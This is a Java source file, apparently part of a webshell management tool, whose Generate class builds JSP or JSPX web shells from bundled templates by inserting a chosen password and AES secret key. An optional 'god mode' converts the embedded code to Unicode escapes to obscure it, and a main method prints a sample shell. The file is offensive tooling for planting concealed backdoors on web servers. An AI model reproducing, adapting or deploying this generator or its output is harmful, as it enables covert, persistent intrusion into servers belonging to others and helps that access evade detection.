package shells.cryptions.JavaAes;

import core.ApplicationContext;
import util.Log;
import util.functions;

import javax.swing.*;
import java.io.InputStream;

class Generate {
    private static final String[] SUFFIX = new String[]{"jsp", "jspx"};

    Generate() {
    }

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + (isBin ? "raw" : "base64") + "GlobalCode.bin");
            String globalCode = new String(functions.readInputStream(inputStream));
            inputStream.close();
            globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
            inputStream = Generate.class.getResourceAsStream("template/" + (isBin ? "raw" : "base64") + "Code.bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            Object selectedValue = JOptionPane.showInputDialog(null, "suffix", "selected suffix", JOptionPane.INFORMATION_MESSAGE, null, SUFFIX, null);
            if (selectedValue != null) {
                String suffix = (String) selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                if (ApplicationContext.isGodMode()) {
                    template = template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code));
                } else {
                    template = template.replace("{globalCode}", globalCode).replace("{code}", code);
                }

                data = template.getBytes();
            }
        } catch (Exception var10) {
            Log.error(var10);
        }

        return data;
    }

    public static void main(String[] args) {
        System.out.println(new String(GenerateShellLoder("123", "key", false)));
    }
}
